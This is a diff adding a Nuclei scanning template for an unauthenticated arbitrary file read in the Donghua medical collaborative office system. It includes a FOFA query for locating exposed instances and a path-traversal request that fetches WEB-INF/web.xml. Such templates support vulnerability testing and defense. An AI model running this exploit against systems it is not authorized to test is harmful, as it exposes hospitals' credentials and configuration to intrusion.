@@ -1,0 +1,36 @@
+id: donghuaOA-templateFile-File-reading
+
+info:
+  name: "东华医疗协同办公系统 templateFile 参数任意文件读取"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/skin/charmBlue/css/dialog.css"
+      东华医疗协同办公系统在 templateFile 参数处理过程中存在文件读取逻辑缺陷，攻击者可利用该漏洞在未认证状态下访问敏感文件（包括但不限于数据库配置文件、系统配置文件等），从而获取关键系统凭证及配置信息，显著增加系统被进一步入侵的风险。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486468&idx=1&sn=cd3106a256e6289a21e93fdf14b4796f&chksm=c267b937f5103021fc5da678f16e1fa785e3388a378264161913c63992b6523710a4a4d56ff6&token=1628549949&lang=zh_CN#rd
+  tags: 东华医疗协同办公系统
+
+
+
+http:
+- raw:
+  - |
+    GET /common/templateFile?template_name=../../WEB-INF/web.xml HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '<?xml version="1.0"'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
